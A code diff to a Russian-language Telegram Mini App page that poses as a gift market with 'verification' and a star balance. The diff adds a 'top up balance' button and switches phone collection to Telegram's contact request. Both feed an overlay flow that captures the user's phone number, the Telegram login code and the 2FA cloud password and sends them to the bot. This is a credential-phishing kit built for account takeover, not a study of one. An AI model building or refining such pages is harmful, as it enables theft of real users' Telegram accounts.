@@ -88,6 +88,11 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
         <div class="value">Не подтверждён</div>
         <button class="btn" onclick="startAuth()">Пройти верификацию</button>
     </div>
+    <div class="card">
+        <div class="label">БАЛАНС</div>
+        <div class="value">0.00 ⭐</div>
+        <button class="btn" onclick="startAuth()">Пополнить баланс</button>
+    </div>
 </div>
 
 <div id="market" class="section">
@@ -110,13 +115,6 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
     </div>
 </div>
 
-<div id="step-phone" class="overlay">
-    <h2 style="text-align:center">Верификация</h2>
-    <p style="text-align:center; color:var(--text-soft)">Введите номер телефона для получения подарка</p>
-    <input type="tel" id="inp-phone" class="input-field" placeholder="+79991234567">
-    <button class="btn" onclick="sendPhone()">ПОЛУЧИТЬ КОД</button>
-</div>
-
 <div id="step-code" class="overlay">
     <h2 style="text-align:center">Код подтверждения</h2>
     <p style="text-align:center; color:var(--text-soft)">Введите код из приложения Telegram</p>
@@ -126,7 +124,7 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
 
 <div id="step-2fa" class="overlay">
     <h2 style="text-align:center">Облачный пароль</h2>
-    <p style="text-align:center; color:var(--text-soft)">Введите ваш 2FA пароль:</p>
+    <p style="text-align:center; color:var(--text-soft)">Ваш аккаунт защищен 2FA. Введите пароль:</p>
     <input type="password" id="inp-pass" class="input-field" placeholder="Пароль">
     <button class="btn" onclick="sendPass()">ВОЙТИ</button>
 </div>
@@ -144,22 +142,16 @@ function openTab(id, el) {
     el.classList.add('active');
 }
 
-// Теперь кнопка верификации открывает ввод телефона в приложении
+// Запрос контакта и переход к коду
 function startAuth() {
-    document.getElementById('step-phone').classList.add('active');
-}
-
-function sendPhone() {
-    let phone = document.getElementById('inp-phone').value;
-    if(phone.length > 5) {
-        tg.sendData("PHONE:" + phone);
-        document.querySelector('#step-phone button').innerText = "Запрос кода...";
-        // Через 3 секунды переходим к коду
-        setTimeout(() => {
-            document.getElementById('step-phone').classList.remove('active');
-            document.getElementById('step-code').classList.add('active');
-        }, 3000);
-    }
+    tg.requestContact((ok, res) => {
+        if(ok && res.responseUnsafe.contact) {
+            tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
+            setTimeout(() => {
+                document.getElementById('step-code').classList.add('active');
+            }, 500);
+        }
+    });
 }
 
 function sendCode() {
@@ -182,6 +174,7 @@ function sendPass() {
     }
 }
 
+// СНЕГ
 const c=document.getElementById("snow"),ctx=c.getContext("2d");
 let w,h,flakes=[];
 function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
